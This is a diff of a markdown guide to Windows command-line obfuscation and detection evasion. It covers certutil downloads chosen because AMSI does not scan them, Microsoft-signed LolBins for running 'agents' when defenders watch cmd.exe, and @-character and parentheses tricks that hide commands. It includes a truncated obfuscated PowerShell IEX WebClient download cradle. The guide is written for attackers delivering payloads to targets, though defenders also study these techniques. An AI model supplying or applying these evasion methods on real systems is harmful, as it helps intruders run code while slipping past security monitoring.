@@ -284,7 +284,7 @@ set !h=n
 <br />
 
 This next technic uses one batch local variable (%varObj%) as MasterKey that allow us to extract<br />
-the character's inside the %varoBj% variable to build our command. [special thanks: @Wandoelmo Silva]
+the character's inside the `%varoBj%` variable to build our command. [special thanks: @Wandoelmo Silva]
 
 <br />
 	
@@ -309,9 +309,9 @@ exit
 	
 <br />	
 
-<b><i>[ certutil - Additional Methods for Remote Download ]</i></b><br />
-Sometimes we need to use non-conventional methods to deliver our agent to target<br />
-system and bypass detection, in this situation certutil can be an useful asset.
+<b><i>certutil - Additional Methods for Remote Download</i></b><br />
+Sometimes we need to use non-conventional methods to deliver our agent to target system and bypass detection.<br />
+In this situation certutil can be an useful asset because AMSI does not scan the download data in oposite to `iwr`.
 
 <br />
 	
@@ -367,13 +367,9 @@ powershell.exe $decoded=[System.Text.Encoding]::UTF8.GetString([System.Convert]:
 	
 <br />
 
-More obscure obfuscated/bypass technics<br />
+<b><i>cmd similar interpreter's (LolBins)</i></b><br />
 
-<b><i>[ cmd similar interpreter's ]</i></b> defenders watching launches of cmd instance?<br />
-then use the follow Microsoft signed binarys to execute your agents.
-	
-<br />
-	
+defenders watching launches of cmd instance? then use the follow Microsoft signed binarys ([LolBins](https://lolbas-project.github.io/#)) to execute your agents.	
 ```cmd
 bash.exe -C calc.exe
 scriptrunner.exe -appvscript calc.exe
@@ -386,7 +382,7 @@ forfiles /p c:\windows\system32\ /m notepad.exe /c calc.exe
 
 <br />
 
-<b><i>[ delimiter removal in cmd interpreter :@= ]</i></b><br />
+<b><i>delimiter removal in cmd interpreter</i></b><br />
 we can use [ `@` ] special char to obfuscate the syscall and then remove it at execution time..<br />
 
 The attacker sets the netstat command in a process-level environment variable called x before passing it to the final cmd.exe as standard input. The attacker also obfuscates the string netstat in the original cmd.exe command using `@` characters. The `@` characters are later removed from the command contents stored in the environment variable x using cmd.exe’s native variable string replacement functionality. `%VariableName:StringToFind=NewString%` where `StringToFind` is the `@` character and `NewString` is blank, so the `@` character is simply removed.
@@ -445,24 +441,32 @@ cmd.exe /c "set x=po@wer@sh@ell.ex@e I@E@X (N@ew-O@bje@ct @Ne@t.@WebC@lie@nt).Do
 
 ---
 
-      [ Parentheses obfuscation ] Evenly-paired parentheses can encapsulate individual commands
-      in cmd.exe’s arguments without affecting the execution of each command. These unnecessary
-      parenthesis characters indicate the implied sub-command grouping interpreted by cmd.exe’s
-      argument processor. Paired parentheses can be liberally applied for obfuscation purposes.
+<br />
+
+<b><i>Parentheses obfuscation</i></b><br />
+Evenly-paired parentheses can encapsulate individual commands in cmd.exe’s arguments without affecting the execution of each command. These unnecessary parenthesis characters indicate the implied sub-command grouping interpreted by cmd.exe’s argument processor. Paired parentheses can be liberally applied for obfuscation purposes.
 
 <br />
 
-- String command to obfuscate<br />
-`cmd.exe /c whoami && netstat`
+String command to obfuscate<br />
+```cmd
+cmd.exe /c whoami && netstat
+```
 
-- String obfuscated [double Parentheses]<br />
-`cmd.exe /c ((whoami)) && ((netstat))`<br />
+String obfuscated [double Parentheses]<br />
+```cmd
+cmd.exe /c ((whoami)) && ((netstat))
+```
 
 ![batch obfuscation](http://i.cubeupload.com/72IYdJ.jpg)
 
-- string more obfuscated using: Parentheses+carets+double_quotes+collon+semi-collon<br />
+string more obfuscated using: Parentheses+carets+double_quotes+collon+semi-collon<br />
 
 ![batch obfuscation](http://i.cubeupload.com/oooagr.jpg)
+
+---
+
+<br />
 
       The batch command 'call' executes one batch file from within another. If you execute a
       batch file from inside another batch file without using CALL, the original batch file
